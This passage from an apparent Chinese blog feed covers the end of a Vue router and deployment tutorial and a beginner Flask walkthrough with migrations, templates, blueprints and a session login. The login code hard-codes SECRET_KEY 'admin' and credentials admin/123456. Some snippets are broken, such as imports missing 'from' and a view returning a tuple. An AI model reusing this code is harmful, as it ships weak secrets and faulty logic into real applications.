<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">methods<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      handleSizeChange(val) <span class="punctuation">&#123;</span></span><br><span class="line">        console.log(`每页 $<span class="punctuation">&#123;</span>val<span class="punctuation">&#125;</span> 条`);</span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      handleCurrentChange(val) <span class="punctuation">&#123;</span></span><br><span class="line">        console.log(`当前页<span class="punctuation">:</span> $<span class="punctuation">&#123;</span>val<span class="punctuation">&#125;</span>`);</span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure>

<p>此时Panigation组件的script部分完整代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">handleSizeChange</span>(<span class="params">val</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`每页 <span class="subst">$&#123;val&#125;</span> 条`</span>);</span></span><br><span class="line"><span class="language-javascript">      &#125;,</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">handleCurrentChange</span>(<span class="params">val</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`当前页: <span class="subst">$&#123;val&#125;</span>`</span>);</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">     <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">tableData</span>: [&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">date</span>: <span class="string">&#x27;2016-05-02&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">name</span>: <span class="string">&#x27;王小虎&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">address</span>: <span class="string">&#x27;上海市普陀区金沙江路 1518 弄&#x27;</span></span></span><br><span class="line"><span class="language-javascript">          &#125;, &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">date</span>: <span class="string">&#x27;2016-05-04&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">name</span>: <span class="string">&#x27;王小虎&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">address</span>: <span class="string">&#x27;上海市普陀区金沙江路 1517 弄&#x27;</span></span></span><br><span class="line"><span class="language-javascript">          &#125;, &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">date</span>: <span class="string">&#x27;2016-05-01&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">name</span>: <span class="string">&#x27;王小虎&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">address</span>: <span class="string">&#x27;上海市普陀区金沙江路 1519 弄&#x27;</span></span></span><br><span class="line"><span class="language-javascript">          &#125;, &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">date</span>: <span class="string">&#x27;2016-05-03&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">name</span>: <span class="string">&#x27;王小虎&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">address</span>: <span class="string">&#x27;上海市普陀区金沙江路 1516 弄&#x27;</span></span></span><br><span class="line"><span class="language-javascript">          &#125;]</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Element库中还有许多各种各样的模块，就不过多去摘抄了，也都可以去官方网站去复制粘贴使用。</p>
<h3 id="5、Vue路由"><a href="#5、Vue路由" class="headerlink" title="5、Vue路由"></a>5、Vue路由</h3><p>首先我们需要先安装vue-router插件，可以通过如下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install vue-router@3.5.1</span><br></pre></td></tr></table></figure>

<p><strong>但是我们不需要安装，因为当初我们再创建项目时，已经勾选了路由功能，已经安装好了。</strong></p>
<p>然后我们需要在<strong>src&#x2F;router&#x2F;index.js</strong>文件中定义路由表，根据其提供的模板代码进行修改，最终代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span>  <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">VueRouter</span>  <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">VueRouter</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> routes = [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/emp&#x27;</span>,  <span class="comment">//地址hash</span></span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;emp&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>:  <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;../views/tlias/EmpView.vue&#x27;</span>)  <span class="comment">//对应的vue组件</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/dept&#x27;</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;dept&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;../views/tlias/DeptView.vue&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">VueRouter</span>(&#123;</span><br><span class="line">  routes</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>注意需要去掉没有引用的import模块。</p>
<p>在main.js中，我们已经引入了router功能，如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-26/f9cd77e8eaaf0da83921d624361fed4c--012d--image-20231126140930945.png" alt="image-20231126140930945"></p>
<p>路由基本信息配置好了，路由表已经被加载，此时我们还缺少2个东西，就是&lt;router-lin&gt;和&lt;router-view&gt;,所以我们需要修改2个页面（EmpView.vue和DeptView.vue）我们左侧栏的2个按钮为router-link,其代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">el-menu-item</span> <span class="attr">index</span>=<span class="string">&quot;1-1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;/dept&quot;</span>&gt;</span>部门管理<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">el-menu-item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">el-menu-item</span> <span class="attr">index</span>=<span class="string">&quot;1-2&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;/emp&quot;</span>&gt;</span>员工管理<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">el-menu-item</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后我们还需要在内容展示区域即App.vue中定义route-view，作为组件的切换，其App.vue的完整代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &#123;&#123;message&#125;&#125; --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;element-view&gt;&lt;/element-view&gt; --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;emp-view&gt;&lt;/emp-view&gt; --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">router-view</span>&gt;</span><span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// import EmpView  &#x27;./views/tlias/EmpView.vue&#x27;</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// import ElementView  &#x27;./views/Element/ElementView.vue&#x27;</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">components</span>: &#123; &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="string">&quot;message&quot;</span>:<span class="string">&quot;hello world&quot;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>但是我们浏览器打开地址： <a href="http://localhost:7000/">http://localhost:7000/</a> ，发现一片空白，因为我们默认的路由路径是&#x2F;,但是路由配置中没有对应的关系，</p>
<p>所以我们需要在路由配置中&#x2F;对应的路由组件，代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> routes = [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/emp&#x27;</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;emp&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>:  <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;../views/tlias/EmpView.vue&#x27;</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/dept&#x27;</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;dept&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;../views/tlias/DeptView.vue&#x27;</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    <span class="attr">redirect</span>:<span class="string">&#x27;/emp&#x27;</span> <span class="comment">//表示重定向到/emp即可</span></span><br><span class="line">  &#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>此时我们打开浏览器，访问<a href="http://localhost:7000/">http://localhost:7000</a> 发现直接访问的是emp的页面，并且能够进行切换了。</p>
<h3 id="6、项目部署打包"><a href="#6、项目部署打包" class="headerlink" title="6、项目部署打包"></a>6、项目部署打包</h3><p>前端打包直接使用npm脚本中的build就行、</p>
<p>然后会在工程目录下生成一个dist目录，用于存放需要发布的前端资源</p>
<p>然后就是项目的部署</p>
<p>将我们之前打包的前端工程dist目录下得内容拷贝到nginx的html目录下</p>
<p>然后启动nginx去启动服务，就成功将该项目部署完成了</p>
<hr>
<p>到这就差不多了这篇，主要就是对java中一些简单的前端知识进行总结。</p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>html</tag>
        <tag>css</tag>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title>python学习经历-2-flask</title>
    <url>/2023/11/13/python%E5%AD%A6%E4%B9%A0%E7%BB%8F%E5%8E%86-2-flask/</url>
    <content><![CDATA[<p>接着之前的python进行学习，决定还是从更加实用点的项目相关的知识去学习，这样也可以去更好的实践当中去锻炼自己的能力，所以就选择了flask这个python中的轻量模块去学习。</p>
<span id="more"></span>

<h1 id="一、python中虚拟环境的使用"><a href="#一、python中虚拟环境的使用" class="headerlink" title="一、python中虚拟环境的使用"></a>一、python中虚拟环境的使用</h1><p>python是一个非常常见的编程语言，在python使用过程中，我们总是需要使用到很多需要自己安装下载的库，所以一般一个python编程人员的电脑上都有着许许多多的python库，而在我们去开发一些网站，程序相关的时候，我们并不需要去使用到我们所有的库，并且可能需要去使用某些特定版本的库，可这又应该怎么办？这个时候，虚拟环境也就因此诞生了。</p>
<blockquote>
<p>在使用Python语言时，通过pip（pip3）来安装第三方包，但是由于pip的特性，系统中只能安装每个包的一个版本。但是在实际项目开发中，不同项目可能需要第三方包的不同版本，迫使我们需要根据实际需求不断进行更新或卸载相应的包，而如果我们直接使用本地的Python环境，会导致整体的开发环境相当混乱而不易管理，这时候我们就需要开辟一个独立干净的空间进行开发和部署，虚拟环境就孕育而生。</p>
</blockquote>
<p>下面就直接去记录一下一些虚拟环境的常见使用方法，最流行的就是Virtualenv这个虚拟环境的配置工具</p>
<p>安装：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">pip install virtualenv virtualenvwrapper-win  //windows环境下</span><br></pre></td></tr></table></figure>

<p>查看虚拟环境有哪些</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">workon</span><br></pre></td></tr></table></figure>

<p>创建一个新的虚拟环境</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mkvirtualenv 虚拟环境名</span><br></pre></td></tr></table></figure>

<p>去使用一个虚拟环境</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">workon 虚拟环境名</span><br></pre></td></tr></table></figure>

<p>注意：虚拟环境文件默认在C盘中用户下中的env中</p>
<h1 id="二、数据库中的数据迁移操作"><a href="#二、数据库中的数据迁移操作" class="headerlink" title="二、数据库中的数据迁移操作"></a>二、数据库中的数据迁移操作</h1><p>数据库首先先初始化连接设置</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">db_uri = <span class="string">&#x27;mysql+pymysql://root:password@localhost:3306/bookdb&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;SQLALCHEMY_DATABASE_URI&#x27;</span>] = db_uri</span><br><span class="line">app.config[<span class="string">&#x27;SQLALCHEMY_TRACK_MODIFICATIONS&#x27;</span>] = <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p>其次就是模块类的创建，也就相当于数据库中的列</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>(db.Model):</span><br><span class="line">    __tablename__ = <span class="string">&#x27;tb_user&#x27;</span></span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>, autoincrement=<span class="literal">True</span>)</span><br><span class="line">    name = db.Column(db.String(<span class="number">30</span>), unique=<span class="literal">True</span>, index=<span class="literal">True</span>)</span><br><span class="line">    age = db.Column(db.Integer, default=<span class="number">1</span>)</span><br><span class="line">    sex = db.Column(db.Boolean, default=<span class="literal">True</span>)</span><br><span class="line">    salary = db.Column(db.Float, default=<span class="number">10000</span>, nullable=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p>为什么要做数据迁移呢？在我的理解中这就相当于一个空白数据库的初始化，将创建的类中的列添加到数据库之中，其实就是相当于我们去创建各个字段的过程。</p>
<p>下面就是用到的命令</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">flask db init   //创建迁移文件夹migrates，只调用一次</span><br><span class="line">flask db migrate //生成迁移文件</span><br><span class="line">flask db upgrade  //执行迁移文件中的升级</span><br><span class="line">flask db downgrade  //执行迁移文件中的降级</span><br></pre></td></tr></table></figure>

<h1 id="三、flask框架中的一些基本操作以及示例"><a href="#三、flask框架中的一些基本操作以及示例" class="headerlink" title="三、flask框架中的一些基本操作以及示例"></a>三、flask框架中的一些基本操作以及示例</h1><h2 id="1、最基础的单文件框架"><a href="#1、最基础的单文件框架" class="headerlink" title="1、最基础的单文件框架"></a>1、最基础的单文件框架</h2><p>文件结构：</p>
<p><img src="http://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-19/4e67729456c911aa9646284ff32250ab--24ca--image-20231119174414920.png" alt="image-20231119174414920"></p>
<blockquote>
<p>static: 静态文件文件夹，用于存放一些像是css，js，image，font等的文件。</p>
<p>templates：用于存放html网站文件</p>
</blockquote>
<p>app.py:（主项目文件）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():  <span class="comment"># put application&#x27;s code here</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index/&#x27;</span></span>) </span><span class="comment">#路由的注册</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hello index!&#x27;</span>  <span class="comment">#页面显示的数据</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<p><strong>app运行的时候一些可选的参数：</strong></p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
<th>默认值</th>
</tr>
</thead>
<tbody><tr>
<td>debug</td>
<td>代码更新是否自动重启</td>
<td>False</td>
</tr>
<tr>
<td>theaded</td>
<td>是否开启多线程</td>
<td>False</td>
</tr>
<tr>
<td>port</td>
<td>指定端口</td>
<td>5000</td>
</tr>
<tr>
<td>host</td>
<td>指定主机（设置0.0.0.0可以通过本地IP访问）</td>
<td>127.0.0.1</td>
</tr>
</tbody></table>
<p>一般项目开发时都会开启debug模式</p>
<h2 id="2、简单的模板渲染"><a href="#2、简单的模板渲染" class="headerlink" title="2、简单的模板渲染"></a>2、简单的模板渲染</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">render_template()  <span class="comment">#可以返回一个渲染的html页面</span></span><br></pre></td></tr></table></figure>

<p>示例：</p>
<p>app.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hello world&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, name=<span class="string">&quot;法外狂徒张三&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>index.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;../static/index.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>index<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>name: &#123;&#123; name &#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以利用render_template去将后端的一些数据返回到前端，然后再使用去使用传递过来的参数</p>
<h2 id="3、对文件结构进行进行拆分"><a href="#3、对文件结构进行进行拆分" class="headerlink" title="3、对文件结构进行进行拆分"></a>3、对文件结构进行进行拆分</h2><p>文件结构：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-19/137d93a1d65364fb1dee979682c5fa2a--6af8--image-20231119182749925.png" alt="image-20231119182749925"></p>
<p>将除了主文件的其他文件都移入一个单独创建的App文件夹当中。</p>
<blockquote>
<p>init.py：初始化的文件，在这里我们将app的创建函数放入其中，待需要使用时导入即可</p>
<p>models.py：模板文件，后边主要用于数据库方面的操作</p>
<p>views.py：视图函数的存放，也就是存放各种路由的地方</p>
</blockquote>
<p>为了方便视图函数的使用，使用蓝图去绑定</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">app.register_blueprint(blueprint=blue)</span><br></pre></td></tr></table></figure>

<p>将app绑定在blue上，这样之后路由就可以这样去使用了</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/home/&#x27;</span></span>)</span></span><br></pre></td></tr></table></figure>

<h2 id="4、简易登录界面的实现"><a href="#4、简易登录界面的实现" class="headerlink" title="4、简易登录界面的实现"></a>4、简易登录界面的实现</h2><h3 id="①cookie的一些设置"><a href="#①cookie的一些设置" class="headerlink" title="①cookie的一些设置"></a>①cookie的一些设置</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">response = redirect(<span class="string">&#x27;/home/&#x27;</span>) <span class="comment">#重定向，用于登录后界面的跳转</span></span><br><span class="line"></span><br><span class="line">response.set_cookie(<span class="string">&#x27;user&#x27;</span>, username, max_age=<span class="number">3600</span>*<span class="number">24</span>*<span class="number">7</span>)</span><br></pre></td></tr></table></figure>

<p>可以直接通过set__cookie去设置一个json格式的cookie</p>
<h3 id="②session的一些设置"><a href="#②session的一些设置" class="headerlink" title="②session的一些设置"></a>②session的一些设置</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure>

<p>将app的配置文件中的SECRET_KEY修改为不空的值，并且将这个作为密匙去加密</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">session[<span class="string">&#x27;user&#x27;</span>] = username</span><br><span class="line"></span><br><span class="line">session.permanent = <span class="literal">True</span>  <span class="comment">#默认是false，关闭浏览器后就清空session</span></span><br></pre></td></tr></table></figure>

<h3 id="③实现"><a href="#③实现" class="headerlink" title="③实现"></a>③实现</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Blueprint, redirect, render_template, request, session</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">blue = Blueprint(<span class="string">&#x27;user&#x27;</span>, __name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/home/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    username = session.get(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;home.html&#x27;</span>, username</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/login/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)   <span class="comment">#获取传递过来的参数</span></span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> password == <span class="string">&#x27;123456&#x27;</span>:</span><br><span class="line">            response = redirect(<span class="string">&#x27;/home/&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># response.set_cookie(&#x27;user&#x27;, username, max_age=3600*24*7)</span></span><br><span class="line">            session[<span class="string">&#x27;user&#x27;</span>] = username</span><br><span class="line">            session.permanent = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;用户名或密码错误！&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/logout/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    response = redirect(<span class="string">&#x27;/home/&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    session.pop(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="comment"># @blue.route(&#x27;/string/&lt;string:name&gt;/&#x27;, methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])</span></span><br><span class="line"><span class="comment"># def get_string(name):</span></span><br><span class="line"><span class="comment">#     print(type(name))</span></span><br><span class="line"><span class="comment">#     return name</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># @blue.route(&#x27;/redirect/&#x27;)</span></span><br><span class="line"><span class="comment"># def make_redirect():</span></span><br><span class="line"><span class="comment">#     pass</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     return redirect(&#x27;https://www.qq.com&#x27;)</span></span><br></pre></td></tr></table></figure>

<p>在自己设计一个前段登入即可</p>
<p>示例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span 